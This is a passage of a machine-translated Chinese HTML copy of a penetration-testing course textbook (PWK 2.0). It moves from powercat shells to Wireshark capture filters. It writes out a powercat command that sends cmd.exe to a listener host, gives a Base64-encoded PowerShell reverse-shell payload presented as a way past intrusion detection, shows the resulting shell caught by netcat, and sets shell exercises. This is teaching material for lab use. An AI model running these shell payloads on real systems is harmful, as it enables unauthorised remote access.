<div style="position:absolute;top:110263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得注意的是，像这样的独立有效载荷可能很容易被 IDS 检测到。</font></font></nobr></div>
<div style="position:absolute;top:110283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体来说，生成的脚本相当大，大约有 300 行代码。</font><font style="vertical-align: inherit;">此外，它</font></font></nobr></div>
<div style="position:absolute;top:110302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还包含许多硬编码的字符串，可以很容易地用于恶意签名</font></font></nobr></div>
<div style="position:absolute;top:110321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动。</font><font style="vertical-align: inherit;">虽然任何特定签名的识别超出了本模块的范围，但它是</font></font></nobr></div>
<div style="position:absolute;top:110341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">足以说明诸如此类的明文恶意代码的成功率可能很低，并且</font></font></nobr></div>
<div style="position:absolute;top:110360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很可能会被防御性软件解决方案所捕获。</font></font></nobr></div>
<div style="position:absolute;top:110393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以尝试通过利用 PowerShell 执行 Base64 的能力来克服这个问题</font></font></nobr></div>
<div style="position:absolute;top:110412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码的命令。</font><font style="vertical-align: inherit;">要生成独立的编码有效负载，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ge</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项并一次</font></font></nobr></div>
<div style="position:absolute;top:110432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次将输出重定向到文件：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:110531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">99 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019），https://en.wikipedia.org/wiki/Payload_（计算）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:110659;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="94"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 94 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:110692;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:111769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:111769;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:111769;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">94</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge &gt; encodereverseshell。</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110807;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110826;left:261"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 122 - 使用 powercat 创建编码的独立负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该文件将包含可以使用 PowerShell </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-E</font></font></b><font style="vertical-align: inherit;">执行的编码字符串</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:110875;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(EncodedCommand)</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font><font style="vertical-align: inherit;">但是，由于</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-E</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项被设计为一种提交</font></font></nobr></div>
<div style="position:absolute;top:110894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行上的复杂命令，生成的encodedreverseshell.ps1脚本不能</font></font></nobr></div>
<div style="position:absolute;top:110914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以与我们未编码的有效载荷相同的方式执行。</font><font style="vertical-align: inherit;">相反，Bob 需要传递整个</font></font></nobr></div>
<div style="position:absolute;top:110933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码字符串到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe -E</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110968;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110985;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA</font></font></b></nobr></div>
<div style="position:absolute;top:111002;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQB</font></font></b></nobr></div>
<div style="position:absolute;top:111019;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACKAewAkAFYAZQByAGIAb</font></font></b></nobr></div>
<div style="position:absolute;top:111036;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAo</font></font></b></nobr></div>
<div style="position:absolute;top:111053;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AIAAagACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByA</font></font></b></nobr></div>
<div style="position:absolute;top:111070;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HMAWWAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIAB</font></font></b></nobr></div>
<div style="position:absolute;top:111087;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc</font></font></b></nobr></div>
<div style="position:absolute;top:111104;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ABDAGwAaQBlAG4AdAAKACAAIAAAgACA</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:111140;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 123 - 使用 PowerShell 执行编码的独立负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行独立的有效载荷后，Alice 在她等待的侦听器上收到反向 shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:111221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:111238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 43725 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:111272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:111292;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 124 - 接收一个独立的反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经介绍了各种可以处理文件传输、绑定 shell 和反向 shell 的工具。</font></font></nobr></div>
<div style="position:absolute;top:111340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些工具在渗透过程中具有不同的特性、优势、劣势和适用性</font></font></nobr></div>
<div style="position:absolute;top:111359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试。</font><font style="vertical-align: inherit;">自行测试 powercat 的功能，以完善您对这一系列</font></font></nobr></div>
<div style="position:absolute;top:111379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很棒的工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111413;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.8.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个从你的 Windows 系统到你的</font></font></nobr></div>
<div style="position:absolute;top:111463;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利机。</font></font></nobr></div>
<div style="position:absolute;top:111491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在你的Windows系统上创建绑定shell并连接</font></font></nobr></div>
<div style="position:absolute;top:111511;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从你的 Kali 机器到它。</font><font style="vertical-align: inherit;">也可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本地连接吗？</font></font></nobr></div>
<div style="position:absolute;top:111539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powercat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一个编码的有效载荷，然后让它通过</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:111559;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">将反向 shell 发送到您的 Kali 机器，同时创建一个编码绑定</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111578;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 系统上使用 shell 并使用 Kali 机器连接到它。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:111847;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="95"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 95 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:111880;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:112957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:112957;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:112957;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">95</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4 线鲨</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个称职的渗透测试人员应该精通网络基础知识。</font><font style="vertical-align: inherit;">一个网络</font></font></nobr></div>
<div style="position:absolute;top:112037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嗅探器，就像行业主食</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 一样</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是学习网络协议的必备工具，</font></font></nobr></div>
<div style="position:absolute;top:112056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析网络流量，调试网络服务。</font><font style="vertical-align: inherit;">在本节中，我们将讨论一些</font></font></nobr></div>
<div style="position:absolute;top:112076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 基础知识。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:112110;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.1 Wireshark 基础</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Libpcap </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">101</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在 Linux 上）或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winpcap </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">102</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在 Windows 上）库来捕获</font></font></nobr></div>
<div style="position:absolute;top:112167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自网络的数据包。</font></font></nobr></div>
<div style="position:absolute;top:112200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用嗅探器分析网络流量时，很容易被大量“噪音”淹没</font></font></nobr></div>
<div style="position:absolute;top:112219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在收集的数据中。</font><font style="vertical-align: inherit;">为了便于分析，我们可以应用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获过滤器</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">103</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示</font></font></i></nobr></div>
<div style="position:absolute;top:112239;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 中的</font><i><font style="vertical-align: inherit;">过滤器</font></i></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">104</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果我们</font><font style="vertical-align: inherit;">在 Wireshark 会话期间</font><font style="vertical-align: inherit;">应用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获过滤器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，任何</font></font></nobr></div>
<div style="position:absolute;top:112258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不匹配过滤条件将被丢弃，剩余的数据被传递到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获</font></font></i></nobr></div>
<div style="position:absolute;top:112277;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引擎</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">捕获引擎然后剖析传入的数据包，分析它们，最后应用</font></font></nobr></div>
<div style="position:absolute;top:112297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示输出之前的</font><font style="vertical-align: inherit;">任何其他</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示过滤器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:112330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程可以用下图形象化：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:112827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Wireshark，2019 年），https://www.wireshark.org/</font></font></font></nobr></div>
<div style="position:absolute;top:112847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">101 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tcpdump 和 Libcap，2019 年），http://www.tcpdump.org/</font></font></font></nobr></div>
<div style="position:absolute;top:112867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">102 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（WinPcap，2018 年），https://www.winpcap.org/</font></font></font></nobr></div>
<div style="position:absolute;top:112887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">103 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Wireshark，2016 年），http://wiki.wireshark.org/CaptureFilters</font></font></font></nobr></div>
<div style="position:absolute;top:112907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">104 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Wireshark，2017 年），http://wiki.wireshark.org/DisplayFilters</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:113035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="96"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 96 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:113068;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:114145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:114145;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:114145;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">96</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113506;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 11：从电线到 Wireshark</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用任何网络嗅探器（包括 Wireshark）的秘诀在于学习如何使用捕获和</font></font></nobr></div>
<div style="position:absolute;top:113556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示过滤器以去除多余的数据。</font><font style="vertical-align: inherit;">幸运的是，Wireshark 的图形界面使它</font></font></nobr></div>
<div style="position:absolute;top:113575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可视化数据和使用各种过滤器相对容易。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:113610;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.2 启动Wireshark</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在以下示例中，我们将在匿名 FTP 登录期间捕获网络流量。</font><font style="vertical-align: inherit;">在我们的</font></font></nobr></div>
<div style="position:absolute;top:113667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 系统，我们使用命令行启动 Wireshark，如清单 125 所示或通过</font></font></nobr></div>
<div style="position:absolute;top:113687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序菜单，它位于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嗅探和欺骗</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子菜单下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo wireshark</font></font></font></b></nobr></div>
<div style="position:absolute;top:113741;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 125 - 从终端运行wireshark</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:113772;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.3 捕获过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 Wireshark 加载时，我们会看到一个基本窗口，我们可以在其中选择网络</font></font></nobr></div>
<div style="position:absolute;top:113829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们要监视的界面以及设置显示和捕获过滤器。</font><font style="vertical-align: inherit;">如上所述，我们可以</font></font></nobr></div>
<div style="position:absolute;top:113848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用捕获过滤器通过丢弃任何未捕获的流量来减少捕获的流量</font></font></nobr></div>
<div style="position:absolute;top:113868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配我们的过滤器并将我们的重点缩小到我们希望分析的数据包。</font><font style="vertical-align: inherit;">请注意，任何交通</font></font></nobr></div>
<div style="position:absolute;top:113887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从捕获过滤器中排除将丢失，因此如果您是，最好定义广泛的捕获过滤器</font></font></nobr></div>
<div style="position:absolute;top:113906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">担心可能会丢失数据。</font></font></nobr></div>
<div style="position:absolute;top:113939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先选择我们想要监控的界面并输入一个捕获过滤器。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:113959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">105</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅捕获 10.11.1.0/24 地址范围内的流量：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:114095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">105 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（伯克利数据包过滤器），http://biot.com/capstats/bpf.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:114223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="97"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 97 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:114256;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:115333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:115333;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:115333;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">97</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114618;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 12：为 tap0 设置捕获过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以通过导航到“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt;“</font><i><font style="vertical-align: inherit;">捕获”</font></i><font style="vertical-align: inherit;">从预定义的捕获过滤器中进行选择</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
